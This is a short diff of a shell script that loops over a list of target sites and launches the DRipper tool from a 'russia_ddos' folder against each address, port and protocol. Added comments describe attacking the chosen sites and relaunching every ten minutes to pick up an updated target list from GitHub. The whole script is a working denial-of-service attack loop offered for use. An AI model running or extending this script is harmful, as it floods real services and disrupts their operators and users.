@@ -28,9 +28,13 @@ do
              addr=$(echo $site | awk '{print $1}')
              port=$(echo $site | awk '{print $2}')
              prot=$(echo $site | awk '{print $3}')
-             echo $addr $port $prot
+             
+             # Launch DRipper to attack site choosen above
              python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
         done
+        
+        # Sleep for 10 min (600 sec). Kill python3 to relaunch DRipper
+        # This will re-read list of sites on github and start to attack new sites if list was updated
         sleep 600
         pkill -9 python3
 done
